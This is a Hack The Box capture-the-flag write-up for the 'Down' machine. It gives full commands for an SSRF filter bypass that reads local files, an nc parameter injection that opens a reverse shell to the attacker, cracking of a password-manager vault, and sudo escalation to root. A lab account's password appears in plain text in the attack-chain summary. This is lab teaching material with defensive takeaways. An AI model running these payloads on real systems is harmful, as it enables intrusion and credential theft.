# **HackTheBox — Down | Full Writeup**

> **Platform:** Hack The Box
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Web / Linux
> **Date:** March 12, 2026

---

## Summary

Discovered a verbose SSRF vulnerability on an "Is it down?" web checker. The app used system `curl` under the hood, which was exploited by passing two URLs — one to satisfy the `http://` filter, and a `file://` URL to read local files. Read the PHP source to discover a hidden `?expertmode=tcp` feature running `nc`. Exploited a parameter injection bug in the port field (validate-one-use-another) to get a reverse shell as `www-data`. Found a `pswm` password manager vault in `aleks`' home directory, brute-forced the master password with `rockyou.txt`, decrypted credentials, SSH'd in, and escalated to root via `sudo`.

---

## Attack Chain

```
[Recon]
  nmap → ports 22, 80 only
  ffuf dir/vhost → nothing interesting externally
         │
         ▼
[SSRF Discovery]
  POST url=http://127.0.0.1 → returns full page content
  nc listener → User-Agent: curl/7.81.0 (app uses system curl!)
         │
         ▼
[Protocol Filter Bypass]
  file://, gopher://, php:// → blocked ("Only http or https allowed")
  Regex only checks START of string: preg_match('|^https?://|')
  curl accepts multiple space-separated URLs
  url=http://***REMOVED*** file:///etc/passwd → BOTH fetched!
         │
         ▼
[File Read via Dual URL Trick]
  file:///etc/passwd          → user: aleks (UID 1000)
  file:///proc/self/environ   → app runs as www-data from /var/www/html
  file:///proc/self/cwd/index.php → full PHP source code leaked
         │
         ▼
[Source Code Analysis]
  Hidden GET param: ?expertmode=tcp
  Reveals nc-based TCP checker form (ip + port fields)
  BUG: validates intval($port) but uses original $port in command
  escapeshellcmd() blocks shell injection but NOT parameter injection
         │
         ▼
[Parameter Injection → RCE]
  POST /index.php?expertmode=tcp
  ip=***REMOVED***&port=443 -e /bin/bash
  Server executes: /usr/bin/nc -vz ***REMOVED*** 443 -e /bin/bash
  → Reverse shell as www-data
         │
         ▼
[User Flag]
  cat /var/www/html/user_aeT1xa.txt → USER FLAG
         │
         ▼
[Privesc: www-data → aleks]
  find /home/aleks/.local -type f
  → /home/aleks/.local/share/pswm/pswm (password manager vault)
  pswm-decryptor + rockyou.txt → master: flower
  Decrypted: aleks@down → 1uY3w22uc-Wr{xNHR~+E
  ssh aleks@10.129.234.87
         │
         ▼
[Privesc: aleks → root]
  .sudo_as_admin_successful → aleks has full sudo
  sudo su → root
  cat /root/root.txt → ROOT FLAG
```

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Web Reconnaissance](#web-reconnaissance)
3. [SSRF Discovery & Exploitation](#ssrf-discovery--exploitation)
4. [Filter Bypass — File Read via Dual URL Trick](#filter-bypass--file-read-via-dual-url-trick)
5. [Source Code Analysis](#source-code-analysis)
6. [Parameter Injection → Reverse Shell](#parameter-injection--reverse-shell)
7. [Privilege Escalation — www-data → aleks](#privilege-escalation--www-data--aleks)
8. [Privilege Escalation — aleks → root](#privilege-escalation--aleks--root)
9. [Key Takeaways](#key-takeaways)

---

## Enumeration

### Port Scan

```bash
nmap -sV -sC -Pn 10.129.234.87 -oN initial_scan.txt
```

**Results:**

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.52 (Ubuntu) |

Only two ports open — the entire attack surface is the web application on port 80.

```bash
# Full port scan to confirm nothing is hidden externally
nmap -p- --min-rate 5000 -T4 -Pn 10.129.234.87 -oN full_ports.txt
# Result: Only 22 and 80 confirmed
```

### Add Hostname

```bash
echo "10.129.234.87  down.htb" | sudo tee -a /etc/hosts
```

---

## Web Reconnaissance

### Directory Fuzzing

```bash
ffuf -u http://down.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 -t 50
```

**Results:**

| Path | Status |
| --- | --- |
| index.php | 200 |
| javascript/ | 301 (403 when accessed) |
| .htpasswd | 403 |
| server-status | 403 |

### Vhost Fuzzing

```bash
# Get baseline response size
curl -si -H "Host: nonexistent.down.htb" http://10.129.234.87 | grep Content-Length
# Content-Length: 739

ffuf -u http://10.129.234.87 \
  -H "Host: FUZZ.down.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,301,302,403 -fs 739 -t 50
# No vhosts found
```

### Tech Fingerprint

```bash
whatweb http://down.htb/index.php
# Apache 2.4.52, PHP, Ubuntu Linux
```

**Page title:** *"Is it down or just me?"* — a URL availability checker. Immediately suggests SSRF potential.

---

## SSRF Discovery & Exploitation

### Identifying SSRF

The application accepts a URL via POST and checks whether it's reachable. Submitting `http://127.0.0.1` returned the full page content — confirming verbose SSRF:

```bash
curl -s -X POST \
  -d "url=http://127.0.0.1" \
  http://down.htb/index.php
# Response: "It is up. It's just you!" + full HTML of the app
```

**Thought process:** An "is it down" checker makes outbound HTTP requests on behalf of the user. Pointing it at `127.0.0.1` is the first SSRF test — and it returned content, meaning this is **verbose SSRF** (full response body returned, not just up/down status). This is far more useful than blind SSRF.

### Confirming the App Uses System curl

Set up a netcat listener and pointed the SSRF at our VPN IP to capture the raw request:

```bash
# Terminal 1
nc -lvnp 8889

# Terminal 2
curl -s -X POST \
  -d "url=http://***REMOVED***:8889/" \
  http://down.htb/index.php
```

**Captured request:**

```
GET / HTTP/1.1
Host: ***REMOVED***:8889
User-Agent: curl/7.81.0
Accept: */*
```

**Key finding:** `User-Agent: curl/7.81.0` — the app calls system `curl` directly, not PHP's cURL library. This is critical because system curl:

- Accepts multiple space-separated URLs
- Supports `file://` scheme for local file reads
- Can be abused for argument injection if input reaches the shell

### Internal Port Discovery

Using SSRF response size as a detection signal:

- **836 bytes** = port closed ("It is down for everyone")
- **>836 bytes** = port returned actual HTTP content
- **Internal server error** = port open but non-HTTP service (Redis, MySQL, etc.)

```bash
# Sweep all ports — flag anything returning more than 836 bytes
for p in $(seq 1 65535); do
  size=$(curl -s -o /dev/null -w "%{size_download}" -X POST \
    -d "url=http://127.0.0.1:$p" \
    http://10.129.234.87/index.php)
  [ "$size" -gt "836" ] && echo "OPEN: $p (size: $size)"
done
```

Only port 80 returned actual HTTP content via SSRF.

---

## Filter Bypass — File Read via Dual URL Trick

### Understanding the Filter

Testing alternate protocols revealed a whitelist:

```bash
curl -s -X POST -d "url=file:///etc/passwd" http://down.htb/index.php
# "Only protocols http or https allowed."

curl -s -X POST -d "url=gopher://127.0.0.1:6379/" http://down.htb/index.php
# "Only protocols http or https allowed."
```

**Thought process:** The filter is blocking alternate protocols. But *how* does the filter work? If it's a simple regex checking the start of the string (`^https?://`), there might be a way to satisfy the check while still sneaking in a second protocol.

The source code confirmed it:

```php
preg_match('|^https?://|', $url)  // only checks the START of the string
```

### The Dual URL Trick

`curl` accepts **multiple space-separated URLs** and fetches them all sequentially. By prepending a valid `http://` token before a `file://` URL, the regex check passes and curl fetches both:

```bash
# What curl actually executes on the server:
/usr/bin/curl -s http://***REMOVED*** file:///etc/passwd
# Result: fetches both — our server gets a hit, file contents returned
```

**Sending via SSRF:**

```bash
curl -s -X POST \
  --data-urlencode "url=http://***REMOVED*** file:///etc/passwd" \
  http://10.129.234.87/index.php
```

**Result — /etc/passwd leaked:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

**Key finding:** Only real user is `aleks` (UID 1000, shell `/bin/bash`).

### Reading Environment Variables

```bash
curl 'http://10.129.234.87/index.php' \
  -d 'url=http:// file:///proc/self/environ' -s \
  | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p' | tr '\000' '\n'
```

Confirmed: app runs as `www-data` from `/var/www/html`.

---

## Source Code Analysis

### Reading index.php via /proc/self/cwd

`/proc/self/cwd` is a Linux symlink to the current working directory of the running process — allowing us to read files relative to the app root without knowing the absolute path:

```bash
curl -s -X POST \
  -d 'url=http:// file:///proc/self/cwd/index.php' \
  http://10.129.234.87/index.php \
  | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p'
```

### Discovering the Hidden expertmode Feature

Inside the source — an `if` branch checking for a GET parameter that's invisible from the outside:

```php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
  echo '<h1>Is the port refused, or is it just you?</h1>
        <form id="urlForm" action="index.php?expertmode=tcp" method="POST">
            <input type="text" id="url" name="ip" placeholder="Please enter an IP." required><br>
            <input type="number" id="port" name="port" placeholder="Please enter a port number." required><br>
            <button type="submit">Is it refused?</button>
        </form>';
}
```

Accessing `http://down.htb/index.php?expertmode=tcp` reveals a second TCP port checker form.

### Identifying the Vulnerability — Validate-One-Use-Another

The expertmode TCP handler contained a critical bug:

```php
$ip = trim($_POST['ip']);
$valid_ip = filter_var($ip, FILTER_VALIDATE_IP);           // validates IP ✅

$port = trim($_POST['port']);
$port_int = intval($port);                                  // "443 -e /bin/bash" → 443
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);  // validates 443 ✅

if ( $valid_ip && $valid_port ) {
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");     // uses $port, NOT $port_int ← BUG
    exec($ec . " 2>&1", $output, $rc);
}
```

**The bug:** `intval()` extracts the leading integer from any string. So `"443 -e /bin/bash"` becomes `443` — which passes validation. But the **original string** is what gets passed to `nc`.

**Why `escapeshellcmd` doesn't save it:** `escapeshellcmd` escapes shell metacharacters (`;`, `|`, `&&`, backticks) to prevent the shell from interpreting them. But `-e /bin/bash` contains no shell metacharacters — it's a valid argument passed directly to `nc`. This is **parameter injection**, not shell injection.

---

## Parameter Injection → Reverse Shell

### Setting Up Listener

```bash
nc -lnvp 443
```

### Triggering the Exploit

```bash
curl -s -X POST \
  "http://10.129.234.87/index.php?expertmode=tcp" \
  -d "ip=***REMOVED***&port=443 -e /bin/bash"
```

The server executes:

```bash
/usr/bin/nc -vz ***REMOVED*** 443 -e /bin/bash
```

**Shell received:**

```
connect to [***REMOVED***] from (UNKNOWN) [10.129.234.87] 47748
whoami
www-data
```

### Upgrading the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User Flag

```bash
cat /var/www/html/user_aeT1xa.txt
```

---

## Privilege Escalation — www-data → aleks

### Enumerating aleks' Home Directory

```bash
ls -la /home/aleks/
```

**Notable findings:**

| File/Dir | Permissions | Significance |
| --- | --- | --- |
| `.ssh/` | drwx------ | SSH keys — not readable as www-data |
| `.sudo_as_admin_successful` | -rw-r--r-- | aleks has previously used sudo |
| `.local/` | drwxrwxr-x | World-writable — worth investigating |
| `.bash_history` | → /dev/null | History deliberately wiped |

### Discovering the Password Manager Vault

```bash
find /home/aleks/.local/ -type f 2>/dev/null
# /home/aleks/.local/share/pswm/pswm

cat /home/aleks/.local/share/pswm/pswm
# e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

`pswm` is a Python CLI password manager that stores credentials AES-encrypted with a master password. The vault format is `ciphertext*iv*salt*tag`. Since the `.local` directory is world-readable, we can read the vault file as `www-data`.

**Thought process:** A password manager vault is a high-value target. Even if the encryption is strong, the master password might be weak. AES is uncrackable, but humans pick terrible master passwords — rockyou.txt is the first thing to try.

### Brute-Forcing the Master Password

On Kali, using [pswm-decryptor](https://github.com/seriotonctf/pswm-decryptor):

```bash
git clone https://github.com/seriotonctf/pswm-decryptor
cd pswm-decryptor
python3 -m venv venv && source venv/bin/activate
pip3 install cryptocode prettytable

# Save the vault
echo 'e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==' > pswm_vault

# Brute-force with rockyou
python3 pswm-decrypt.py -f pswm_vault -w /usr/share/wordlists/rockyou.txt
```

**Result:**

```
[+] Master Password: flower
[+] Decrypted Data:
+------------+----------+----------------------+
| Alias      | Username | Password             |
+------------+----------+----------------------+
| pswm       | aleks    | xxxxxx               |
| aleks@down | aleks    | xxxxxxxxxxxxxxxxxxxx |
+------------+----------+----------------------+
```

### SSH as aleks

```bash
ssh aleks@10.129.234.87
# Password: 
```

---

## Privilege Escalation — aleks → root

### Checking sudo Permissions

```bash
sudo -l
```

The presence of `.sudo_as_admin_successful` in aleks' home confirmed sudo access. On Ubuntu, users in the `sudo` group get `(ALL:ALL) ALL`.

### Root

```bash
sudo su
cat /root/root.txt
```

---

## Key Takeaways

**1. Verbose SSRF is significantly more dangerous than blind SSRF**
When the app returns the full response body, SSRF becomes a file reader, internal service enumerator, and RCE stepping stone — not just a port scanner.

**2. User-Agent reveals the implementation**
Catching `User-Agent: curl/7.81.0` on our netcat listener immediately revealed the backend was calling system `curl` — which supports multiple URL arguments and `file://` scheme. Always catch the request on a listener before assuming how SSRF is implemented.

**3. Understand the filter before trying to bypass it**
Testing `file://` first, then probing `http://file://` and `http:// file://` progressively revealed that the filter only checked the start of the string. Systematic boundary testing reveals the exact weakness.

**4. Read source code whenever possible**
The `?expertmode=tcp` feature was completely invisible from outside — no directory fuzzing would find a GET parameter. Source code reveals hidden functionality, logic bugs, hardcoded secrets, and developer mistakes that are impossible to discover from black-box testing alone.

**5. Validate-one-use-another is a devastating bug**
Converting `$port` to `$port_int` for validation but then using the original `$port` in the command is subtle but critical. Always use the sanitized/validated variable in the actual operation, never the original input.

**6. Parameter injection ≠ shell injection**
`escapeshellcmd` neutralizes shell metacharacters but cannot prevent passing extra flags to the underlying binary. `-e /bin/bash` contains no shell metacharacters — it's a clean argument that `nc` happily accepts. These are two different attack classes requiring different defenses (`escapeshellarg` on individual arguments would have prevented this).

**7. Password manager vaults are high-value targets**
When a vault file is world-readable, brute-forcing the master password with a common wordlist can yield immediate credential access. The encryption algorithm doesn't matter if the master password is `flower`.

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service enumeration |
| `ffuf` | Directory and vhost fuzzing |
| `curl` | Manual HTTP requests and SSRF testing |
| `netcat` | Listener for User-Agent capture and reverse shell |
| `whatweb` | Web technology fingerprinting |
| `pswm-decryptor` | Brute-force pswm master password and decrypt vault |
| `rockyou.txt` | Wordlist for password cracking |

---

*Written by k41r0s3 | HackTheBox | Down*
